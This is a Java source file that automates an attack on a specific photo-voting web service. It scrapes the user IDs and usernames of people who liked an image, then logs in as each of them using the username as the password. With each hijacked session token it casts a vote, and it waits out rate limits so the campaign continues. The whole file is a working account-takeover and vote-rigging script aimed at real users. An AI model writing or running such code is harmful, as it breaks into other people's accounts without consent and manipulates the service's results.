package net.lqm.main;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;

import net.lqm.util.HttpUtils;
import net.lqm.util.ReadFileUtil;

public class CrackAndDelMain {
	public static void main(String[] args) {
		for (String userId : getFavoriteUsers("66657")) {
			try {
				String name = getUserName(userId);
				String str = loginWeApp(name);
				if (str != null) {
					votePhoto(str);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	private static List<String> getFavoriteUsers(String imageId) {
		List<String> returnList = new ArrayList<String>();
		String url = "http://smile.stdecaux.net.cn/stdecaux/api/photo/favoriteUsers";
		String param = "{\"parameters\":{\"is_all\":\"1\",\"image_id\":\"" + imageId + "\"}}";

		String res = HttpUtils.sendPost(url, param);

		Map<String, JSONObject> map = (Map<String, JSONObject>) JSON.parse(res);
		String userListStr = map.get("content").get("favorite_users") + "";
		JSONArray users = (JSONArray) JSON.parse(userListStr);
		for (Object user : users) {
			JSONObject jo = (JSONObject) JSONObject.toJSON(user);
			returnList.add(jo.get("user_id").toString());
		}
		return returnList;
	}

	private static String getUserName(String userId) {
		String url = "http://smile.stdecaux.net.cn/stdecaux/api/photo/otherPublishes";
		String param = "{\"parameters\":{\"user_id\":\"" + userId + "\"}}";

		String res = HttpUtils.sendPost(url, param);
		JSONObject jo = JSON.parseObject(res);
		JSONObject content = (JSONObject) jo.get("content");
		JSONObject userinfo = (JSONObject) content.get("user_info");

		return userinfo.get("username") + "";
	}

	private static String loginWeApp(String user) {
		String url = "http://smile.stdecaux.net.cn/stdecaux/api/user/login";
		String param = "{\"parameters\":{\"version\":\"1.4.0\",\"username\":\"" + user + "\",\"password\":\"" + user
				+ "\"}}";

		String res = HttpUtils.sendPost(url, param);

		Map<String, JSONObject> map = (Map<String, JSONObject>) JSON.parse(res);

		try {
			map.get("content").get("token").toString();
			System.out.println(user);
			return map.get("content").get("token").toString();
		} catch (Exception e) {
		}
		return null;
	}
	
	private static void votePhoto(String token) {
		String url = "http://smile.stdecaux.net.cn/stdecaux/api/photo/favoritePicture?token=" + token;
		String param = "{\"parameters\":\"+9RYRteOWgzyO6yWNobDH96IN2ysZHu4S6cqEW2zaQKw+rx7okwKSxESXsqT cJmS\"}";
		
		String res2 = HttpUtils.sendPost(url, param);
		if(res2.indexOf("200")>0) {
			System.out.println("success");
		}else if(res2.indexOf("201")>0) {
//			System.out.println(res2);
			System.out.println("over times");
			try {
				System.out.println("michlie wait 15mins");
				Thread.sleep(1000*60*15);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			return;
		}else
			System.out.println("michlie"+res2);
	}
}
